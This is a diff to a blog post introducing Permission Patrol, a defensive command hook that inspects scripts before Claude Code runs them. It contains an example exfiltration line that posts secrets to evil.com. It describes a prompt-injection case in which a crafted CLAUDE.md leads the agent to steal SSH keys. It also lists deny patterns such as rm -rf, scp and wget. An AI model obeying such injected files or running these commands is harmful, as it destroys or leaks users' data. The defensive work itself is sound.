@@ -1,8 +1,31 @@
 ---
 title: "Permission Patrol: An AI Security Guard for Claude Code"
 date: 2026-02-06
-description: "How I built a command hook that reads script content before Claude Code executes it — catching hidden shutil.rmtree() and rm -rf that prompt hooks can't see."
-tags: ["claude-code", "ai-security", "hooks", "python", "open-source"]
+description: "Stop using --dangerously-skip-permissions. Permission Patrol is an open-source command hook that reads script content before Claude Code executes it — catching hidden rm -rf, data exfiltration, and prompt injection that prompt hooks can't see."
+tags:
+  - claude-code
+  - ai-security
+  - hooks
+  - command-hook
+  - python
+  - open-source
+  - dangerously-skip-permissions
+  - prompt-injection
+  - defense-in-depth
+  - script-inspection
+keywords:
+  - claude code security
+  - claude code dangerously-skip-permissions
+  - claude code hooks
+  - claude code command hook
+  - claude code permission guard
+  - ai agent security
+  - claude code safe mode
+  - claude code script inspection
+  - prompt injection prevention
+  - defense in depth ai
+  - claude code permission request hook
+  - how to secure claude code
 categories: ["Projects"]
 ShowToc: true
 TocOpen: true
@@ -11,6 +34,20 @@ cover:
   alt: "Permission Patrol - AI Security Guard for Claude Code"
   hidden: true
 ---
+
+## Why `--dangerously-skip-permissions` Is Dangerous
+
+Many developers run Claude Code with `--dangerously-skip-permissions` to avoid the constant permission prompts. It's tempting — no interruptions, fully autonomous coding. But you're giving an AI agent **unrestricted access** to your filesystem, network, and shell.
+
+Here's what can go wrong:
+
+- **Accidental file deletion.** Claude might run `rm -rf` on the wrong directory, or a script it generates calls `shutil.rmtree()` on a path outside your project. With no permission check, it just happens.
+- **Prompt injection.** A malicious `CLAUDE.md` or a crafted file in a cloned repo can instruct Claude to exfiltrate your SSH keys, `.env` files, or source code. With `--dangerously-skip-permissions`, there's nothing stopping it.
+- **Unreviewed scripts.** Claude generates and runs Python/Node/Bash scripts all the time. Without permission checks, you never see what's inside — even if the script contains `requests.post("https://evil.com", data=secrets)`.
+
+The manual alternative isn't great either. Clicking "Allow" on every permission prompt means you're reviewing hundreds of requests per session. Most people stop reading after the first few — which means **long bash chains** and **innocent-looking script names** slip through without real scrutiny.
+
+**Permission Patrol is the middle ground.** It auto-allows safe operations (zero latency), auto-denies known-dangerous patterns (zero cost), and uses AI review only for the ambiguous cases that actually need human-level judgment. You get security without the friction.
 
 ## The Problem: Claude Code Runs Scripts Blindly
 
@@ -182,6 +219,35 @@ That's it. Permission Patrol is now guarding your sessions.
 2. **Deterministic rules first, AI second.** Using `settings.json` rules for common patterns means zero latency and zero cost for 90% of operations. AI review is reserved for the ambiguous cases.
 
 3. **Defense in depth.** No single check is perfect. Combining regex patterns, file content inspection, path checks, and AI review creates multiple layers of security.
+
+## Frequently Asked Questions
+
+### Does Permission Patrol work with `--dangerously-skip-permissions`?
+
+No — and that's the point. `--dangerously-skip-permissions` disables **all** permission checks, including hooks. Permission Patrol is designed for normal mode, where it replaces the manual "Allow/Deny" workflow with automated, intelligent review. You get the speed of skip-permissions with the safety of human review.
+
+### How is a command hook different from a prompt hook?
+
+A **prompt hook** asks an LLM to review the command string (e.g., `python3 script.py`). A **command hook** runs a script that can do anything — including reading the actual file content before execution. Permission Patrol uses a command hook so it can inspect what's *inside* scripts, not just the command name.
+
+### Does it require a separate API key?
+
+No. Permission Patrol calls `claude` CLI internally, which uses your existing Claude Code subscription. No extra API key, no additional cost.
+
+### What dangerous patterns does it catch?
+
+Permission Patrol catches patterns in two layers:
+
+- **Regex (instant, no AI):** `rm -rf`, `shred`, `curl POST`, `scp`, `wget`, `chmod 777`, data exfiltration commands
+- **AI review (Claude Haiku):** `shutil.rmtree()`, `os.remove()`, `requests.post()`, obfuscated code, file system access outside the project, code injection patterns
+
+### Does it slow down Claude Code?
+
+Deterministic allow/deny rules (Phase 1) add near-zero latency. AI review (Phase 2) takes 1–3 seconds via Claude Haiku — only triggered for ambiguous cases like script execution. In practice, 90%+ of operations are handled by Phase 1 rules instantly.
+
+### Can I customize the allow/deny rules?
+
+Yes. Edit the `permissions` section in your `~/.claude/settings.json`. Add patterns to `allow` for commands you trust, or `deny` for commands you want blocked. The rules use glob patterns like `Bash(git *)` or `Bash(rm -rf *)`.
 
 ## Links
 
